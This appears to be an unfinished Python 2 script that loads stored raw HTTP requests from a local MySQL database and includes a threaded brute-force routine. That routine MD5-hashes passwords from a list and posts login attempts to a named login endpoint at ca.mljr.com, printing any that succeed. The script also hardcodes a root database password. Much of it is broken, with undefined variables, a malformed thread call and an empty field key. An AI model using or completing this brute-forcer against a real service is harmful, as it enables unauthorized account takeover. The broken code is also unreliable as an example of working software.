import MySQLdb
import argparse 
import threading
from BaseHTTPServer import BaseHTTPRequestHandler
from StringIO import StringIO

class HTTPRequest(BaseHTTPRequestHandler):
    def __init__(self, request_text):
        self.rfile = StringIO(request_text)
        self.raw_requestline = self.rfile.readline()
        self.error_code = self.error_message = None
        self.parse_request()

    def send_error(self, code, message):
        self.error_code = code
        self.error_message =emessage

#request_text = (
#    'GET /who/ken/trust.html HTTP/1.1\r\n'
#    'Host: cm.bell-labs.com\r\n'
#    'Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.3\r\n'
#    'Accept: text/html;q=0.9,text/plain\r\n'
#    '\r\n'
#    )
#
#request = HTTPRequest(request_text)
#
#print request.error_code       # None  (check this first)
#print request.command          # "GET"
#print request.path             # "/who/ken/trust.html"
#print request.request_version  # "HTTP/1.1"
#print len(request.headers)     # 3

db = MySQLdb.connect("127.0.0.1", "root", "123456", "secpassword", charset='utf8',port=3307)
cursor = db.cursor()
#sql = "select password from password_dict where dicttype = \"%s\""  % ("1w")
#cursor.execute(sql)
#results = cursor.fetchall()
#password_list = []
#for row in results:
#    password_list.append(row[0]) 
#    print row[0]
def getrequest(id):
    sql = "select httpbody from http_body where id = %s"  % (int(id))
    cursor.execute(sql)
    result = cursor.fetchone()
    return result
    
    


def bruteforce(http):
        #headers = {"content-type":"application/json"}
    for password in passlist:
        try:
            m = md5.new()
            m.update(password)
            password1 =  m.hexdigest()
            data={"appCode":"EContract","":username,"userPwd":password1}
            #print data
            r = requests.post("http://ca.mljr.com/privilege/inner/login",headers=headers,data=json.dumps(data))
            #print json.loads(r.text).get("errorCode")
        except Exception,e:
             print e
        else:
            if json.loads(r.text).get("errorCode") != "9000":
                print r.status_code,username,password
                time.sleep(0.2)
                                #pass



def main():
    for i in xrange(0,20):
        t = threading.Thread(target,args=())
        t.join()
        t.start()
    pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('id', nargs='+', help='url ')
    args = parser.parse_args()
    print args.id
    print type(args.id)
    args = parser.parse_args()
    httpbody = getrequest(args.id[0])
    print httpbody[0],type(httpbody[0])
    request = HTTPRequest(httpbody[0])
    print request
#
    print request.error_code       # None  (check this first)
    print request.command          # "GET"
    print request.path             # "/who/ken/trust.html"
    print request.request_version  # "HTTP/1.1"
    print len(request.headers)     # 3
    print request.headers.keys()   # ['accept-charset', 'host', 'accept']
    print request.headers['host']  # "cm.bell-labs.com"
    url = request.headers['host'] + request.path
    print url
    #main()

